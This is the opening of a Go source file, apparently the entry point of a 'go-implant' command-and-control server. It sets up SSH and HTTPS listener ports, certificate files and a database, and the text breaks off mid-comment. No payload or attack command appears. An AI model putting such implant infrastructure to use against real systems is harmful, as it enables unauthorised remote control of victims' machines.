package main

import (
	"flag"
	"fmt"
	"go-implant/server/config"
	"go-implant/server/handler"
	"go-implant/server/model"
	"go-implant/server/ssh"
	"go-implant/server/view"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/fatih/color"
)

func banner() {
	color.Set(color.FgYellow) // set color for the logging
	fmt.Println("\nGo-Implant")
	color.Unset() // Don't forget to unset
}

// Main
func main() {

	var certfile string
	var privkeyfile string

	// define command line arguments
	flag.IntVar(&config.SSHport, "sshport", 22, "port of SSH listener")
	flag.IntVar(&config.Handlerport, "handlerport", 443, "port of HTTP* listener")
	flag.StringVar(&certfile, "cert", "server.crt", "file with https cert")
	flag.StringVar(&privkeyfile, "privkey", "server.key", "file with private key for cert")
	useHTTP := flag.Bool("http", false, "use HTTP instead of HTTPS")

	// parse command line arguments
	flag.Parse()

	// init database
	model.InitDB()

	// print banner
	banner()

	// reg